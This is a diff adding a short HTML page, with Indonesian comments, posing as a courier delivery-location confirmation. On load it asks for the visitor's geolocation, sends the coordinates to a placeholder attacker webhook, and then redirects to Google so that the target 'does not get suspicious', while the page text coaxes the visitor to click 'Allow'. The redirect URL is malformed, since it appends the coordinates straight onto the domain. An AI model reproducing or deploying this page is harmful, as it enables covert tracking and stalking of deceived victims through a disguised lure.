@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>Konfirmasi Lokasi Pengiriman</title></head>
+<body>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Meminta izin lokasi secara otomatis saat halaman dibuka
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var lon = position.coords.longitude;
+                    
+                    // Mengirim koordinat ke Webhook kamu
+                    fetch("URL_WEBHOOK_KAMU_DISINI?lat=" + lat + "&lon=" + lon);
+                    
+                    // Alihkan target ke Google Maps asli agar tidak curiga
+                    window.location.href = "https://www.google.com" + lat + "," + lon;
+                }, function(error) {
+                    alert("Izin lokasi diperlukan untuk melanjutkan.");
+                });
+            }
+        };
+    </script>
+    <h2>Memuat Peta...</h2>
+    <p>Mohon klik "Izinkan" untuk melihat kurir terdekat.</p>
+</body>
+</html>
